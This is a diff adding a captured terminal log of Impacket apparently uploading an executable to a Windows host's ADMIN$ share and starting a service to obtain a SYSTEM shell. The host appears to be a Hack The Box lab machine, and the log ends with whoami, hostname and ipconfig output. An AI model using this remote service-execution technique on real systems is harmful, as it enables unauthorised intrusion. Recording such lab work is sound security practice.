@@ -1,0 +1,31 @@
+Impacket v0.11.0 - Copyright 2023 Fortra
+
+[*] Requesting shares on 10.10.14.22.....
+[*] Found writable share ADMIN$
+[*] Uploading file kMbPqRxz.exe
+[*] Opening SVCManager on 10.10.14.22.....
+[*] Creating service iVnM on 10.10.14.22.....
+[*] Starting service iVnM.....
+[!] Press help for extra shell commands
+Microsoft Windows [Version 10.0.17763.5820]
+(c) 2018 Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32>whoami
+nt authority\system
+
+C:\Windows\system32>hostname
+FILE02
+
+C:\Windows\system32>ipconfig
+
+Windows IP Configuration
+
+
+Ethernet adapter Ethernet0:
+
+   Connection-specific DNS Suffix  . : htb.local
+   IPv4 Address. . . . . . . . . . . : 10.10.14.22
+   Subnet Mask . . . . . . . . . . . : 255.255.255.0
+   Default Gateway . . . . . . . . . : 10.10.14.1
+
+C:\Windows\system32>
